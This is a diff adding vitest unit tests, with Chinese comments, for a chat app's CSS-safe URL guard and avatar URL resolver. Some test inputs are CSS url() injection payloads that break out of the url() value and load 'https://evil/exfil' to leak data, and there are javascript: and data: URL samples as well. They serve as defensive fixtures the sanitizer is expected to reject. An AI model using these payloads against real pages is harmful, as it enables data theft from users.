@@ -4,7 +4,13 @@ import { buildMessageParts } from "./data";
 import type { Message, MessageAttachment, MessageBlock } from "./data";
 import { afterEach } from "vitest";
 
-import { isSafeUrl, messageReplyPreview, thumbWidth } from "./utils";
+import {
+  cssUrlSafe,
+  isSafeUrl,
+  messageReplyPreview,
+  resolveAvatarImageUrl,
+  thumbWidth,
+} from "./utils";
 
 function makeMessage(
   partial: Omit<Partial<Message>, "parts"> & {
@@ -128,6 +134,48 @@ describe("isSafeUrl", () => {
     expect(isSafeUrl(undefined, "link")).toBe(false);
     expect(isSafeUrl("", "image")).toBe(false);
     expect(isSafeUrl("   ", "link")).toBe(false);
+  });
+});
+
+describe("cssUrlSafe:CSS url() 上下文专用守卫", () => {
+  it("放行协议安全且无 CSS 元字符的正常 URL", () => {
+    expect(cssUrlSafe("https://e.example/a.png", "image")).toBe("https://e.example/a.png");
+    expect(cssUrlSafe("https://e.example/v.mp4", "link")).toBe("https://e.example/v.mp4");
+    expect(cssUrlSafe("/avatars/a01.png", "image")).toBe("/avatars/a01.png");
+    expect(cssUrlSafe("mediaproxy://abc", "image")).toBe("mediaproxy://abc");
+  });
+
+  it("拒绝含引号/括号/反斜杠等 CSS 元字符的 URL(防 url() 闭合注入)", () => {
+    // 视频缩略图无引号 url() 注入向量:用 ) 闭合再追加 CSS。
+    expect(cssUrlSafe("https://e/x.jpg);background:url(https://evil/exfil?c=", "link")).toBeNull();
+    // 头像 url("...") 注入向量:用 " 闭合字符串。
+    expect(cssUrlSafe('https://e/a.jpg");content:url("https://evil/exfil', "image")).toBeNull();
+    expect(cssUrlSafe("https://e/a.jpg'", "image")).toBeNull();
+    expect(cssUrlSafe("https://e/a.jpg\\", "image")).toBeNull();
+    expect(cssUrlSafe("https://e/a b.jpg", "image")).toBeNull(); // 含空白
+  });
+
+  it("协议不安全时返回 null(继承 isSafeUrl 的协议白名单)", () => {
+    expect(cssUrlSafe("javascript:alert(1)", "link")).toBeNull();
+    expect(cssUrlSafe("data:text/html,x", "image")).toBeNull();
+    expect(cssUrlSafe(undefined, "image")).toBeNull();
+  });
+});
+
+describe("resolveAvatarImageUrl:头像背景值始终 CSS 安全", () => {
+  it("采用合法真实头像 URL", () => {
+    expect(resolveAvatarImageUrl("seed", "https://e.example/avatar.png")).toBe(
+      "https://e.example/avatar.png",
+    );
+  });
+
+  it("含 CSS 元字符的可控头像 URL 回退到本地占位图(不注入 CSS)", () => {
+    const out = resolveAvatarImageUrl("seed", 'https://e/a.jpg");x:url("https://evil');
+    expect(out).toMatch(/^\/avatars\/a\d{2}\.png$/);
+  });
+
+  it("空头像回退到本地占位图", () => {
+    expect(resolveAvatarImageUrl("seed", undefined)).toMatch(/^\/avatars\/a\d{2}\.png$/);
   });
 });
 
